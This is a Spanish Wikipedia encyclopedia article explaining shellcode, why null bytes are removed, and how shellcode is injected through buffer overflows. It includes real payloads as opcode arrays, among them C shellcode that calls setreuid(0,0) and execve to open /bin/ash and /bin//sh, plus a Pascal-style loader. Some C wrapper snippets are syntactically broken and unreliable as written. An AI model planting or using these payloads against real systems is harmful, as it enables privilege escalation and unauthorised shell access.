---
type: Artículo de enciclopedia
title: Shellcode
description: "Una shellcode («código de shell») es un conjunto de órdenes programadas generalmente en lenguaje ensamblador y trasladadas a opcodes (conjunto de valores hexadecimales) que suelen ser inyectadas en la pila de ejecución …"
resource: https://es.wikipedia.org/wiki/Shellcode
tags: [seguridad, wikipedia]
sources:
  - {"id": "eswiki", "title": "Wikipedia (es) 2026-11-01", "author": "community:wikipedia-es", "last_modified": "2026-11-01T00:00:00Z", "resource": "https://es.wikipedia.org/wiki/Shellcode"}
license: CC BY-SA 4.0
id: eswiki-Shellcode
generated: {"by": "alejandria/2026.11.27", "at": "2026-11-27T17:14:52Z"}
status: stable
stale_after: 2027-11-27T17:14:52Z
---

# Shellcode

Una ***shellcode*** («código de *shell*») es un conjunto de órdenes programadas generalmente en lenguaje ensamblador y trasladadas a *opcodes* (conjunto de valores hexadecimales) que suelen ser inyectadas en la pila de ejecución de un programa para conseguir que la máquina en la que reside se ejecute la operación que se haya programado.

 Término
El término *shellcode* deriva de su propósito general, al tratarse de la carga útil que se emplea en la explotación de una vulnerabilidad con el fin de obtener una *shell* con la que comprometer la máquina comprometida. Este es actualmente el propósito más común con que se utilizan.

 Información
Las *shellcodes* deben ser cortas para poder ser inyectadas dentro de la pila, que generalmente es un espacio reducido.

Las *shellcodes* se utilizan para ejecutar código aprovechando ciertas vulnerabilidades en el código llamadas desbordamiento de búfer. Principalmente el *shellcode* se programa para permitir ejecutar un intérprete de comandos en el equipo infectado.

Es común que en la compilación de una *shellcode* se produzcan bytes nulos, los cuales deben ser eliminados de la misma, ya que frenarían la ejecución de la *shellcode*. Para ello el programador se vale de diversas técnicas, como reemplazar las instrucciones que genera bytes nulos por otras que no lo hagan o realizar una operación XOR, mover hacia registros más pequeños (como AH, AL), y de esta forma permitir que la *shellcode* sea realmente inyectable.

 Ejemplos de *shellcode*
 Ejemplo de shellcode en Pascal
Para ejecutar una *shellcode* generalmente suele utilizarse un lenguaje de más alto nivel, como es el caso del lenguaje Pascal.
Los opcodes obtenidos de nuestro código ensamblador son enlistados en una matriz de tipo byte y cargado en un prototipo para ser invocado.

Un ejemplo de un *shellcode* es el siguiente:
  **Prototipo** Ejec

  ' Variables.
  **Var** ShellCode[]:**Byte** ' Matriz de byte para los OpCode..
  **Var** Prototipo:Ejec   ' Prototipo que ejecutara el ShellCode.

  ' Inicializamos/cargamos el ShellCode.
  ShellCode =   [&31,&d2,&b2,&30,&64,&8b,&12,&8b,&52,&0c,&8b,&52,&1c,&8b,&42 _
  		,&08,&8b,&72,&20,&8b,&12,&80,&7e,&0c,&33,&75,&f2,&89,&c7,&03 _
  		,&78,&3c,&8b,&57,&78,&01,&c2,&8b,&7a,&20,&01,&c7,&31,&ed,&8b _
  		,&34,&af,&01,&c6,&45,&81,&3e,&46,&61,&74,&61,&75,&f2,&81,&7e _
  		,&08,&45,&78,&69,&74,&75,&e9,&8b,&7a,&24,&01,&c7,&66,&8b,&2c _
  		,&6f,&8b,&7a,&1c,&01,&c7,&8b,&7c,&af,&fc,&01,&c7,&68,&79,&74 _
  		,&65,&01,&68,&6b,&65,&6e,&42,&68,&20,&42,&72,&6f,&89,&e1,&fe _
  		,&49,&0b,&31,&c0,&51,&50,&ff,&d7]

  'Le establecemos al prototipo código para ejecutar.
  Prototipo@ = ShellCode[0]@

  ' Ejecutamos el ShellCode.
  Prototipo
Como se puede apreciar, los opcodes son valores hexadecimales que son convertidos a bytes (valores enteros entre 0 a 255) y que el sistema operativo comprende como código ensamblador que ejecuta.

 Ejemplo de *shellcode* en C
En el siguiente ejemplo se muestra una *shellcode* contenida en un *array* de un programa escrito en lenguaje C:

char shellcode[]=
    "\x31\xc0"             /* xorl    %eax,%eax   */
    "\x31\xdb"             /* xorl    %ebx,%ebx   */
    "\x31\xc9"             /* xorl    %ecx,%ecx   */
    "\xb0\x46"             /* movl    $0x46,%al   */
    "\xcd\x80"             /* int     $0x80       */
    "\x50"                 /* pushl   %eax        */
    "\x68""/ash"           /* pushl   $0x6873612f */
    "\x68""/bin"           /* pushl   $0x6e69622f */
    "\x89\xe3"             /* movl    %esp,%ebx   */
    "\x50"                 /* pushl   %eax        */
    "\x53"                 /* pushl   %ebx        */
    "\x89\xe1"             /* movl    %esp,%ecx   */
    "\xb0\x0b"             /* movb    $0x0b,%al   */
    "\xcd\x80"             /* int     $0x80       */

Así tenemos que una *shellcode* es código máquina escrito en notación hexadecimal. Posteriormente se utilizan dentro de programas escritos en C, como en el siguiente *shellcode* de ejemplo:

// shellcode.c
// compilar con gcc shellcode.c -o shellcode
void main
{
((void(*)(void))
{
"\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9"
"\xb0\x04\xb3\x01\x59\xb2\x21\xcd\x80\x31"
"\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff"
"\xff\xff\x76\x69\x73\x69\x74\x61\x20\x68"
"\x74\x74\x70\x3a\x2f\x2f\x68\x65\x69\x6e"
"\x7a\x2e\x68\x65\x72\x6c\x69\x74\x7a\x2e"
"\x63\x6c\x20\x3d\x29"
}
);
}

O este otro:

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
                   "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
                   "\x0b\xcd\x80";
int main
{
    void (*fp);
    fp = (void*) &shellcode;
    fp;
}

 Véase también
 Seguridad informática.
 Inseguridad informática.
 Desbordamiento de búfer.
 Desbordamiento de pila.
 HoF.
 Exploit.
 Bug.
 Subdesbordamiento de búfer.
